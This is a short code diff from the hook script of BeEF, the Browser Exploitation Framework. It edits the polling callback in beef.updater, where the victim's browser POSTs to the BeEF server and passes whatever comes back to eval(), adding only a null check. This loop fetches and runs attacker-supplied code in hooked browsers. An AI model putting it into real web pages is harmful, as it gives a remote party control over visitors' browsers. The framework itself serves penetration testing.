@@ -50,7 +50,12 @@ beef.updater = {
 			beef.net.request(
 				beef.net.beef_url + beef.net.beef_hook,
 				'POST',
-				function(response) { if(response.length > 0) {eval(response); beef.updater.execute_commands();} },
+				function(response, textStatus) { 
+					if(response != null && response.length > 0) {
+						eval(response); 
+						beef.updater.execute_commands();
+					} 
+				},
 				beef.updater.build_updater_params()
 				);
 		} catch(e) {
